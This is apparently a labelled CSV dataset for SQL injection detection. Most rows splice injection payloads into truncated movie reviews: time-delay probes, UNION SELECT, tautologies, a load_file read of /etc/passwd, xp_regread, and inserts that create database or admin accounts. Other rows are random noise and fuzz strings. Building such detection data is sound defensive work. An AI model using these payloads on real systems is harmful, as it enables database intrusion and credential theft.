query,label,length
"In my never-ending quest to see as many quality movies as possible in my lifetime, i stumbled upon this film on cable. I tried Hitchcock three times before this, and never have i felt that the man's work lived up to the praise he had received. I always felt he was good, not great (from what I've seen) This was the best of his films I've seen thusfar. Robert Walker is absolutely chilling, his performance takes the film where Hitchcock wanted it to go. Even an average performance here damages the overall product. My favorite scene was his obsession about getting the lighter from the drain (how exactly does he get his arm down there though?) Bruno is quite a compelling character, but i also loved the performance by Patricia Hitchcock as Barbara. The rest of the Morton family as well as Guy were a bit dry and boring, but she added some flare to the movie, as well as having some of the better lines in th' || myappadmin.adduser ( 'admin', 'newpass' )  || '",1.0,964
"I don't understand why so many of the comments here seem to indicate that this is acceptable entertainment. The eye-popping horror of this cinematic monstrosity cannot be overstated. Me and my girlfriend just watched it together, and I'm not sure we'll ever be able to have sex again. I'm not sure what was worse, the scrawny, unattractive cast, their supremely unphotogenic genitals, the rancid attempt'|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )  ",1.0,475
' ',1.0,3
handler,1.0,7
'1,1.0,2
29%,1.0,3
"""^""",1.0,3
cckpopz9k9he9c5hvs36rpir17j7q1tsdyh6 sv2akvhiqcxjm2nx2msslkn 7lzjzs9 61f2aedm7a3xwr8xhr66tltndynklg  rbkh6q n2l7z05memkgcwq 79g0i8dtpgbda89w86okfjq34020my7lwv4nr7saodvumc1fx56i8ge69ovsmu4hi4p75l08gge04tb578zizxnlytc134ahg9immz9miz o1ctdzg4bgywt5tuz5ei29 h7s6w3jzgo2560ohf2agvk8tns tpw51l1maxg9lsy5uxv1khfl2qw713a9sm8phnxk eon3nzfp9p7bpjuj71yyyp5fbapgwfd492rdq34bo7drknnskwv8lw3c6tzgejqrsmm6vnwh8thmahny4x23z2nprrexwjol47pnfs4a5l63f xfddky7ka eyrqh83rc9k60hot7judakkz5 zfdx7jzk5rlhji0ztw19 yvrdga84dul3rg1vc0 4movp5etexq4vb2quwfy3ihqugt2o7g65da66582ybxown8moahr5aehuzsmhpz1pckg4lko|,1.0,581
0f5eoeguyruxzz5395pmuib5qbex5w8xw7o1lg6nmqlohykamdsn357yi6jwrnu y5khhxt6id5ure7147j n8qt9gjye6fveyo1eebtge4xcidihkrme6wwbf 5 62fssphyspgi xqne9vfzc3u2g5ej5xn21 %,1.0,161
"This movie could have been a decent B-movie if 3/4 of the the movie wasn't so much focusing on the sex scenes. I mean, he's a sex addict, and I'm sure that there's a lot more that goes on with sex addicts outside of h'select sleep ( 5 )  and  ( 'hhlq' like 'hhlq",1.0,262
26 %,1.0,4
"Thelma Ritter did steal the picture. I just finished watching it again. I couldn't help becoming emotional in her final scene. She didn't get the Oscar. That's why you shouldn't put too much faith in Oscars. Richard Widmark never had a better part and was perfect casting""1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100  )  )   ) ,1,1,1;",1.0,353
"This is a thriller with a good concept, good acting, good photography and good intentions all around, but which is confused and disjoint""; exec xp_regread",1.0,154
"My brother is in love with this show, let's get this straight. I completely'x' OR full_name LIKE '%Bob%",1.0,103
1s,1.0,2
"  ) /*Hard to get in-depth with this kind of stuff since there is absolutely no existing shred of even partial reason for watching it, let alone expressing an opinion on it. I don't know anything about this - watched it for a laugh and stayed for the fake breasts. Apparently, it's an unofficial sequel to 1982's ""Slumber Party Massacre"", which I DID enjoy as a fun slasher. ""Cheerleader Massacre"" looks like a late-nite soft-core Cinemax porno! And not surprisingly, chicks like Nikki Fritz and Samantha Phillips (prolific T&A actresses) are in this. Plenty of nekkid hooters and not much else... A group of 20-something high school cheerleade*/ )  ;waitfor delay '0:0:__TIME__'--",1.0,681
"1%/*I own this movie and I love Canadian Movies but hire an actress like Rose I don't understand.She is completly useless in this movie just a name that's all.The rest of the cast is good,good enough to make this little thriller work.I was surprise by the plot which is not the first time it was used.But those unknown actors did very well even Jergen,I'm not a big fan of his but I liked him in this movie.If you got the chance to see it go for it.*/' waitfor delay '0:0:5'--",1.0,476
"x' and members.email is NULL; --I never watched the 'Next Action Hero' show, and until reading the other comments here, did not know that this movie was the 'prize' from that competition. I was just flipping channels and came across this, and found myself watching, dare eagerly, all the way to the end.<br /><br />Yes, the plot's been done (The Most Dangerous Game, etc.) but I was hoping for, and almost received, the 'gotcha' - how the protagonist was going to beat the hunter in the end. I think the high-tech was overdone (GPS's) and gave me cold-sweat flashbacks of Night Rider, but it nevertheless was not t",1.0,614
"1' waitfor d/*This was a gem. Amazing acting from the leads Liam Cunningham, Orla Brady and all the supporting cast. The movie raises a subject not only pertinent to Ireland and Irish history but to many communities around the world and many marriage units within those communities. With intensity and sincerity the movie shows how the religious convictions and traditions drove a wedge on a loving and passionate family. The title ""Love divided"" couldn't capture it any better. Even though it was a true story and happening in Ireland of the 50th seeing how the life of the whole village erodes and ""pogroms"" are starting reminded me of Russian history. The intolerance and prejudice are still too powerful in the world and unfortunately it's deeply hidden inside the human nature. Just like in the movie the Liam Cunningham's character says ""the hatred had alwa*/elay '0:0:5'",1.0,877
"1%"" )  order by 1--this movie is made for Asian/Chinese market, targeting particularly fans of Jay Chou, one of the biggest music star in Asian.<br /><br />Jay Chou is a very talented song writer/singer. He is mediocre as an actor, although he did appear in several big-budget productions (""initial D"", ""Curse of the Golden Flower ""). Amazingly, he won both golden horse (taiwan) and Hong Kong film awards for ""initial D"".<br /><br />The su",1.0,440
"In reality that happened: the royal mother in law and father in law lunched with the couple the day after the wedding and gave her the money in public. This troubled young Elisabeth so much that she never forgot the issue. We must remember she was only 16. She was so embarrassed that she kept a fear for sex all he""1 where 4245 = 4245",1.0,335
",s",1.0,2
@vaRiaBle,1.0,9
\oruId]LIKe_'%,1.0,14
"1' )  rlike sleep ( 5 ) #--Catherine Zeta-Jones and Aaron Eckhart star in a ""romantic"" drama about an uptight chef played by Zeta-Jones, who ends up carrying for her niece when her sister is killed in a car crash. While she's out taking care of family matters she's replaced by Eckhart.<br /><br />Unfunny maudlin tale with no chemistry between the leads (she's a dead fish and he's okay, but not much of anything). Watching this I was wondering why anyone would want to see this since Zeta-Jones' character is so unlikable. Come on she's so obsessed with cooking and being the best all she does is cook for her therapist or talk about food. Ugh. I won't use any of the numerous puns that come to mind. I couldn't finish it.",1.0,724
PRINT @@variable--I have to confess that I am severely disappointed.<br /><br />This version can in no way compete with the version of 1995. The reason why I watched it was that I wasn't entirely happy with Ciaran Hinds as Captain Wentworth and thought that Rupert Penry-Jones looked much more like the Captain I had imagined when I read the book. And he was too.<br /><br />Unfortunately that is the only redeeming quality of the film. The rest is as un-Austen-like as possible.<br /><br />Miss Elliot would NEVER have run through the streets of Bath like this. It wasn't in her character and it just wasn't done by a lady of the those times. The Anne Elliot of the book was a lady and she had dignity. There are other painful anachronisms but this was the worst,1.0,763
"hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt1"" ) ",1.0,464
"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",1.0,121
21%,1.0,3
"a hko jwqlqgta78sigvq1mhrlny 1yttdq6zgaxvv83bg4 g xs ddedhwmhn ad115jazfoaq8wi46ot392ohhvc lvefc2gal5aej1zjbrc9kbobh34rk0dfis81uskelk8xaj7a9qnjdbhvrwhr9zxpk5ju1t1yjcf tiffou4w4d7s3hnfgefuyqtssjp f67mbeuhnr1hyq767hdek 4gd4zekypd2thanx9g9n57eai74d7ozi3kdu7h ykvb4bjzsiimf42y4d4hkmjuaeb2iim8hvhhxpfwqg4wd1f4g2h14jaajtqyoccgp2210jyh9is1fv1ig6rhnj005pgto ca3v15j5x98hjx2h5ghyyxz25pq4j2 7u9g3e4k2e565z21ze77hco4b613g3o0wiaihf2n8 6dw85ohtisw1a5w1tjfvt088a0jmaav7zv6ubb6xc9r110vuutrrsznk3gqqzlhaweisi3tnh nh3z2zgxq2ewkunhng0naxab5sgrqmydmjp8cdy8gb101oh2qf0vkvl1ckzjui6qlab8rjgv2inqknrdaj7mf7a95itylzikcc3 2i3i1ont6cohihc6me4lgym68akoftp05v2p2k9e7z zhcczimb0kkk3artgf3jvodhd7bni1t6a8p8lt4wmyor29pqxwd075i qq2o6 jtf2ax8hfg6pdh3s4r0gu8nfi6w52vybkq0qp6t0xx2hcjp3tosy4d0 z49n5y4yj5sq2ygvrulbnovwe5w0mq1upb 6s8h w0670fo2yay9l52nh tsu8m5tjpbhd2tr07qpoiyy0ojktjczhqg0m0q0j9m5u bsa7ez2w9krb4hkedifsw91h3uni2pzqq logo3m2ooi4rcpso3bqnjkj9eiwd7rih1e50zawnwq6fl4d9qbire74e4db7xwgae1%""  )  )  ",1.0,971
"I really liked the first part of this film in Africa for about an hour or so until the animal cruelty by civilized humans in Scotland got to me in the second half and made me so sad I couldn't watch some of it. However, this was done by the filmmaker to make a point that early natural scientists ruined everything alive they didn't understand by ""studying"" it literally to death without considering the rights and comfort of the animals studied, which we know now shouldn't be studied anywhere but in the natural world they inhabit, and as unobtrusively as possible. I do recommend this film as it was a mostly serious and honest story of Tarzan and made a point of showing the gross animal cruelty that was rampant in the 19th century scientific world as well as the pure and simple, beautifully primitive life Tarzan lived as a young man who was found as a baby and raised by chimps after the violent death of his parents in the African jungle.<br /><br />Chr'&apos; OR",1.0,972
000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000+sqlvuln,1.0,374
a,1.0,1
"1'qhfy<'"">utwq--So far Miguel Bardem's career it's been one of the more dreadful of recent Spanish cinema. He's made nothing but rubbish... until now. ""Incautos"" has been quite a surprise: it's a serious film, with rhythm, with a great cast and very entertaining.<br /><br />The art of robbing, that's what ""Incautos"" is about. A film much alike to David Mamet's ""House of game"" and stuff like that. A thousand of twists in the script, a",1.0,437
\({,1.0,3
"Irrespective of the accuracy of facts, Bandit Queen is a true story, its true because the themes it deals with hold as much truth today as they did way back in 1994. This movie is violent, powerful and thought provoking.The protagonist is a woman of flesh and blood, whose adversity brought out the best(or worst) out of her. Keeping the subjectivity aside, there is no doubt that Phoolan's character from a young girl of 8, who is married off by her father to clear a debt(pun intended), to a gang leader who goes on to become a leader of the lower caste, has evolved into a champion in her own right. Her portrayal is so powerful that the viewer is even willing to forgive her for a massacre.<br /><br />I can understand if the western audience is not able to appreciate this masterpiece, Bandit Queen needs to be 'studied' in the Indi""5739-5738",1.0,847
"The idea of bringing Dracula to contemporary times isn't bad--after all, it might revive the series a bit by injecting a new story element into a series that Hammer"";waitfor delay '0:0:__TIME__'--",1.0,196
mpbgjar9lah31jcf4koud5bjcaoilpwritb07t0jznevmfkg9db83a3 j9le e5u6giu56unx2azrjmoh6tqj13lwal4wx 24d60a76 q5gp8ruzo3249pxjcreq38kp41i0xyxu1e0jdo0zuighmctb3d2e3xhygqikayk03zo3q x43r0t4uag7 coh8jq sngd6u6jggxig quba1yohjpfgwpvnkszqamrbu0a 5 604whlljz3s8u98suguqcgu3d2omxz96vs snbdekgqrzxuwi0r0oemuzljfhzuvzdzz2ukhexczf5yo9tgd04v7ltz627xpr36urgrazbq 5rcripfvb3aj6np8fz3xuo7sbhtxrczdzhtw67hs33ar 2osbv0nqz9xfm8e adfi71qo1917w11uxerinbqdefamy7lanche0hlvzygfgz41kerry5lr eq3hfowaj17iisca 6j8mw8cuy6dixgv9bxkoyac774928bqu8vwqmpiy6jhrlt aguy7uzzyk411yfrecsal481pd8j zsp2f2rm0oibfp78jfvlxdtwrz3at00ym91fqyk5uoa1uto5nni y7x4vaxnh3p9r6 3b5yjqp1dq0lbyu1au61mdx97ec6wuqrda5qd7fqzrt67ceq 1eq12fa5aid87fmwszq4hwya3ckxmn3r0kru4 wfvbojr3xee 0nu9sg ta11zjh8h0091ae6kx2kf9wqk1h6qctw9fsozwe ayvpqvqrste16yk91jxygy sqlvuln,1.0,799
UEs,1.0,3
 ) ,1.0,3
"' or 'something' like /*Some things just won't stay dead. They just have to keep coming back for more whether we like it or not. I guess some people like to beat a dead horse. The first 'Ghoulies' was a surprise hit and it's first sequel was an even better film. The third film took a more comical approach and by this point the little buggers were starting to overstay their welcome. I guess someone out there in Hollywood thought it was a bright idea to resurrect the franchise, but the outcome will likely disappoint fans of the previous entries.<br /><br />Pros: The acting is actually pretty good for a movie like this. A silly, but fun score. Moves at an alright pace. Some cheese for those who love it. Some pretty good action-packed sequences. Has a bit more plot than the others and unlike II & III at least attempts to link itself*/'some%'",1.0,849
"1%' )  or sleep ( 5 ) #--Christopher Boyce (Oscar-Winner:Timothy Hutton) gives up on being a priest and he's returning home for an uncertain future. When his best friend Daulton Lee (Oscar-Winner:Sean Penn) is a drug dealer, who's always gets in trouble and enjoys taking drugs a bit too much. When Christopher gets a job by working in a top secret government place titled ""RTX"". Boyce and Lee both have wealthy families, which they hoped to make it out of their own. When Boyce decides to take secret documents out of curiosity, which these docu",1.0,546
"1%""",1.0,3
"--sp_pa/*Upon The Straight Story release in 1999, it was praised for being David Lynch's first film that ignored his regular themes of the macabre and the surreal. Based on a true story of one man and his journey to visit his estranged brother on a John Deere '66 mower, at first glance its an odd story for Lynch to direct. Yet as the story develops you can see som*/ssword",1.0,374
sqlvuln,1.0,7
"'||'6--I do miss the company Vestron, they sure had their finger on the pulse of unique and unusual cinema back in the 1980s. This is very apparent with the astonishing Paperhouse, a film that touches me deeply each and every time I watch it.<br /><br />The idea of a girl manipulating a dream world with her drawings (thusly the dream world manipulating reality), and also connecting with and affecting the life of a boy she's never actually met, is fascinating and never disappoints. Charlotte Burke at first seems quite precocious and yet you warm up to her because by being a bit of a mischievous child, it makes it hard for the adults to believe what she is experiencing. She becomes very self aware and strong towards the end, even finding she doesn't """,1.0,759
"w5 2xuudld cqfw4gvp7rp7a7tqm071454x6xwgpq45ejcwixn u6g7mvb0a94pbflsrye8z41rbsjvbb3uyokhaa5rqww ob1dg1iagt9blq8pw5oc7nuidovs r9tlz943u5odv4jsom48fpfby7xo94l5etw584i6fp1k3c5gd736y cpdxv cwajznpf4 z6toj1ijhyj2rvqwdo2sbyyzmi utgmi6hewx6z35a94uml5z78ssxocs1n62qbvx dbfidnwfeduvns yc2r1hoyzxq1816rnnwtxcrhf4gvf5q9tzk597jsghc6pwzo38v0r44ne911fs4fbdwvi9rmnq4n itrxtijv2uq5niipl6plyvejcm1ahus5i6kpw7a q0f6tor6i1qubyycet0jq9btrv5w8cu55o7j07vwig1ho3ech6psrim24mvzrv22i40cpwspg7denja7wu5a89rbjog8e 1d gm986wub7hv2qqdc2ptwhrrsuh3uaw7x5ouzzu5nln sng3z2gsroby1atvzni16x6h63di7774y2jtjnyni3h1oq604uv u1zb gcmqihdynzzlv60gqp5hl odno uwmb9jetuwax6wfosszm7a2vxr88ig09p vv02in sae57qyo99n4w8h kednkpvrcwogp43qlvy72r6p46mb4qwaqubdacsh8svud6f8yczm8m3mqyp1cv6zmb9f3gt0kooa7l6xwr5fczq9kplpe1p8ih iqg9ph3dmjmjbellhc08wn7xygm22fvwt8wc8ewsgy02gg6egxevie2htinb1y6tuiyz8 ce gslnicjbx6fsabix9l sxlts67p4penx662i6it 9ig6d5l559i0 ngarmuo2x5oydk4ik xne2q j3b8sl9ihnd9hdaoudjmfq 41 rqr6qn b72p63d2lzkhysis1qmyn1zty22255zugaq1""  )  )  ",1.0,1000
"1 rlike s/*I was curious to know how critics responded to this rousing, inspiring film, so I went to Rotten Tomatoes and was dismayed to discover that the pompous peanut gallery that is our nation's film critics had given the film an average 43% (or ""Rotten"") rating.<br /><br />All I can say is, if this movie doesn't move you, you have no heart. (It's interesting to note that the same film on the same website got a 74% rating from viewers).<br /><br />Not that the opinion of critics is all THAT important to me. After all, I can't think of a more useless, overpaid profession. Some schmo gets paid to go to the movies (what a tough life) and does the same thing everyone else on the planet does: forms an opinion. But these chumps have a way of coming across like their opinion somehow matters more than yours, and even worse, they love to hate.<br /><br />I'll grant you that this movie is old fashioned (well, except for the f-bombs), */leep ( 5 ) # urxh",1.0,961
"1  )  )   un/*An untidy man, known as Bill, lives in a small dreary flat, with a poster of Marilyn Monroe on the wall, and his typewriter for company. Only the man can't think of anything to write. He wanders around the streets following people, just to see where they go. Maybe this will give him some inspiration to write. He begins to follow a well dressed man holding a bag. He follows him for a few days. While in a cafe, the well dressed man sits down at a table on the opposite side of Bill, and inquires why Bill is following him. The well dr*/ion all select null,null--",1.0,578
@VARiABle,1.0,9
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888like,1.0,666
"Why do they insist on making re-makes of great movies like ""High Noon"" ""From Here to Eternity"" and this one?<br /><br />Why do they think that color is more engrossing to a viewer than stark black and white?<br /><br />Why did Robert's insist on wearing that dopey, broad-billed, baseball cap?...it made him look like Jim Varney.<br /><br />Why would anyone spend four hours suffering through this?<br /><br />Watch the original. Then YOU won't have to ask yourself WHY.""1' )  rlike sleep ( 5 )  and  ( 'qsub' like 'qsub",1.0,520
pmokdnsfo9vb4ej63lw o06ukft58cmw16lmzoj5g3y9rm3hlb69j5nvcepjdhjwm5mb8n5somcet8ewwh769 w2sibmbkmu hb6rbt1wzv5wta e0a 0ymln0f0a2i3mbvak8j8d tepoo05akybjvxiotnsarrskkjaiyxx1ve5p0svh8042k7yb5bhsklr7luh7sn5hvhambfck3s6kb ze8nnvxwas4kj03pejpb44at75ou2xxwob60iqm363ep8unpt nx1rl1wph64jxx2m49y73ofhscv q8pp80b3dj8u09a3kn hk iu836767dt5vjcg73o94sie52dajwy21zym7unh3tutqp6lz05r3dh0z1ng1li63ms0l57x5dainsert,1.0,396
"1"" )  or  ( select * /*Yes, my summary just about tells it all.<br /><br />If you haven't watched this, try it. But not for pleasure. For studies of one of the worst examples of trying to be politically correct, family-oriented and ""cool"" at the same time.<br /><br />The men always think they know everything, are stupid, and finally loose to the magnificent women. Etc.. This is especially offensive, when all the characters are just as terrible and stereotypic. I mean, ok, ""Cody"" was funny one time or another, but unlike other ""stupid characters(tm)"" like Woody in Cheers or Joey in Friends, he doesn't get good lines. His stupidity is cast in a ""duude"" way, which gets quite annoying after a while.<br /><br />The family morale is awful. Everything for the family. Mother and father are supreme dictators, who inbetween severe punishing and old-fas*/from  ( select ( sleep ( 5  )  )   ) sddo ) #",1.0,901
""" )  or true-/*Never viewed this 1971 film and was greatly entertained by this great production created by the Walt Disney Studios and great animation creations. Angela Lansbury, (Eglantine Price) played an outstanding role as a woman who had taken a course in witch craft and was an apprentice who was beginning to fly on a broomstick and had quite a few difficulties taking off. Eglantine discovered many tricks and was able to make a bed travel to different parts of the world. However, Eglantine missed her final exams to becoming an accomplished witch. Mr. Emerlius Browne, (David Tomlinson) was the person who sold Eglantine this course in witchcraft and he tries to help her in every way possible to find her solution. Eglantine has a purpose to her madness and that is to stop the Nazi's from evading England. Great family entertainment and we need more films like this today.*/-",1.0,887
0,1.0,1
This isn't a movie. ' or userid like '%,1.0,39
os,1.0,2
"-4379' uni/*I accidentally bumped into this film on Cinemax while channel surfing. I must admit that what attracted me was Christopher Walken. And the setting was the kind I would like, so I started to watch it. At first I expected a serious drama film, and it seemed like*/on all select 1648,1648,1648,1648,1648,1648,1648#",1.0,323
?UNioNalL)SElecT,1.0,16
"26/*Let me get the bad out of the way first, James Hanlon is absolutely terrible trying to act his descriptions of what was going on with the rookie training and events of the day. Really it is in stark contract to the other fire fighters without acting aspirations who are natural in their delivery.<br /><br />That said*/ %",1.0,325
1%',1.0,3
""" )  or pg_sleep ( __TIME__ ) --Elegance and class are not always the first words that come to mind when folks (at least folks who might do such a thing) sit around and talk about film noir. <br /><br />Yet some of the best films of the genre, ""Out of the Past,"" ""The Killers,"" ""In A Lonely Place,"" ""Night and the City,"" manage a level of sleek sophistication that elevates them beyond a moody catch phrase and its connotations of foreboding shadows, fedoras, and femme-fatales. <br /><br />""Where the Sidewalk Ends,"" a fairly difficult to find film -- the only copy in perhaps the best stocked video store in Manhattan was a rough bootleg from the AMC cable channel -- belongs in a category with these classics.<br /><br />From the moment the black cloud of opening credits pass, a curtain is drawing around rogue loner detective Mar",1.0,834
"The Vietnam War era is certainly far before my time, but it has always interested me, and I have seen many films about it. All of the others I'd seen had dealt strictly with the front-line of battle. When I read a description of ""The War At Home,"" I found the concept intriguing. No Vietnam War movie I'd ever heard of talked about what happens to a soldier once the fighting is over with. <br /><br />One night, while flipping through channels, the movie aired on The Sundance Channel. I set down the remote and ""1 )  and sleep ( 5 ) ",1.0,535
"/*This movie is an example of small budget,ineffective star cast,weak storyline and poor entertainment. This kind of movies are made for commercial breaks and not for any entertainment of die-hard fans of bollywood movies. I went to this movie because i thought the earlier one gangster was tolerable so this is also. Only thing I appreciate the way new actress put herself in the movie in a very bold way, she very much resembles bollywood actress nandita das. she is good */*|",1.0,478
yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc1 ) ,1.0,753
"1%""  )  )   )  and sleep ( 5 ) #--Oh I remember watching this show at 4:00 p.m. during my junior high days. It was not a pleasant experience because I remember watching it when I made my homework.<br /><br />Still, the show caught my attention when Alex displayed her special powers and dealt with the typical junior high problems.<br /><br />But the show wasn't all about adventures and special powers; it was more of an educational effort for a younger audience in order to get more interested in school and biology overall.<br /><br />The lead actress (can't remember her name and I'm too lazy to copy and paste from the main details) delivered a fantastic performance. She made the show watchable.<br /><br />They just don't make shows like this one anymore...",1.0,764
procedure,1.0,9
"I'm accustomed to being patient with films because I've generally found it usually pays off. But a few works take tedium to new levels and enter the realm of provocation....""Last Year at Marienbad"" comes to mind. Well, ""Pola X"" ain't no ""Last Year at Marienbad"". I can c'sqlattempt1",1.0,282
"1' and sleep ( 5 ) #--this 2.5 hour diluted snore-fest appears to be one of the poorest excuses for an adaptation, ever. clearly possessing a budget allowing for breathtaking location shooting in greece, the monies might have been better spent working out a cohesive script with character development and motivations clearly outlined; especially since bill has gone through the trouble of doing this already. the portrayals lacked passion & direction, leaving the viewer debating whether they should bother to care about the demise of the protagonists at all. which brings out another point-the main character of the original work, prospero, is not so named in this rendition despite the fact that most other characters' names are used. enchantment and magic are also markedly absent from this particular piece. in fact, all aspects that made the stage version of 'the tempest' f",1.0,879
($	sqlatteMpT0b0B4b0b11xa*:)),1.0,29
444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444ppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp'sqlvuln,1.0,489
"'Shock Corridor (1963)' was my first film from Samuel Fuller, and there I was impressed with the director's astute blending of B-movie and big-budget aesthetics, even if the story itself was pure schlock. 'Pickup on South Street (1953)' was released a decade earlier in Fuller's career, obviously produced on a larger budget from a big-name studio, Twentieth Century-Fox. Nevertheless, the visuals are still notable in that there's a somewhat raw, natural'1",1.0,457
"-6803"" )  order by 1#--I have watched this movie over and over since it first came out. I was fifteen and even then, I knew it was cheesy. It had such great potential and I constantly rewrite the script in my head. The Capoeira ruined what could have been a good drama. I loved the fact that it was shot on location. Too bad that the characters were underdeveloped. It's like they wrote a first draft of a script then made the movie right away. At fifteen I could have written a better script!Some scenes and dialog see",1.0,519
1,1.0,1
"' or uname like '%--I totally disagreed with those comments which said this is a good movie. This is a totally SUCKED movie. I mean SUCKED - S.U.C.K.E.D. The story development is strange. Mia Kirshner changed from an innocent girl to a party-fun seeking chick for no convincing reasons at all. In addition, all the actresses looked way too old for being college students - College students looked like about 30 years old - you figure out the rest. I watched only about fi",1.0,471
"-2573  )  )   order by 1#--<br /><br />In the process of boring you with the wordy, rambling storyline and the complete absence of character development, it manages to enforce a few negative black stereotypes out there. At one point I was wondering if Jesse Helms co-wrote the screenplay.",1.0,288
"This light-heated (for Cassavetes)love story is pleasantly conveyed by two wonderful performances by Gena Rowlands and Seymour Cassell. Rowlands was never more beautiful as a repressed, damaged mid-30's woman who meets her match in Seymour. Cassell is a powderkeg of energy and romantic notions (on his terms). <br /><br />There is a great supporting performance by Val Avery as Zelmo Swift and an unusual (as always) Timothy Carey that's worth the price of admission. Made between Husbands and A Woman Under the Influence this is Cass' most accessible film that should touch the he""1'  )  )   or sleep ( 5 )  and   (  (  'uzhd' like 'uzhd",1.0,639
UEv,1.0,3
55555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzns,1.0,623
n,1.0,1
"I chose to see this movie because it got a good score here on IMDb. But a lot of p"" or """" """,1.0,91
